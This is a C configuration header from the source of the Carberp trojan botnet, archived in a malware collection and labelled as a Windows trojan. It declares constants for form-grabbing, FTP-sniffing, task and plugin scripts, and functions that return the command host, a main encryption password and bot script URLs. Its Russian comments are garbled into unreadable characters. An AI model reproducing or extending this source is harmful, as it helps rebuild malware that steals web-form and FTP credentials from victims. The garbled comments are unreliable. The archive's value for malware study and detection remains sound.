/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#ifndef ConfigH
#define ConfigH
//----------------------------------------------------------------------------

#include <windows.h>

//********************************************************************
//
//  ���������� ��� DEBUGCONFIG ���� ���������� ���-�� ���
//  ����������� ���������� ���������
//
//********************************************************************



#if !defined(DEBUGCONFIG) && defined(DEBUGBOT)
	#define DEBUGCONFIG
#endif

// ���������, ������ ��������

const BYTE  ScriptConfig      = 1;  // ���� ��� �������� ����������������� �����
const BYTE  ScriptFormGrabber = 2;  // ������ �������� ������ HTML ����
const BYTE  ScriptTask        = 3;  // ������ �������� �����
const BYTE  ScriptPlugins     = 4;  // ������ �������� ��������
const BYTE  ScriptFTPSniffer  = 5;  // ������ �������� ������ FTP ���������
const BYTE  ScriptFirstInfo   = 6;  // ������ �������� ������� � �������
const BYTE  ScriptGrabber     = 7;  // ������ �������� ������������ ������

#define MAX_PASSWORD_SIZE 64  // ������������ ������ ������


char *GetCurrentHost();
PCHAR GetCurrentHost2();


// ������� ���������� ������ ��� ����������� �����������/������������ ������
PCHAR GetMainPassword();

// ������� ���������� ��� ���������� �������
PCHAR GetBotScriptURL(BYTE Script);

// ������� ���������� ���������� ��� �������
PCHAR GenerateRandomScript(DWORD Min1, DWORD Max1, DWORD Min2, DWORD Max2, DWORD ExtsCount, PCHAR *Exts);

int GetDelay();

char *GetPrefix();


// � ���������� ������ ������������� ����������� ���������� ���������� ����
#ifdef DEBUGCONFIG
void SetDebugHost(PCHAR Host);
#endif

//----------------------------------------------------------------------------
#endif

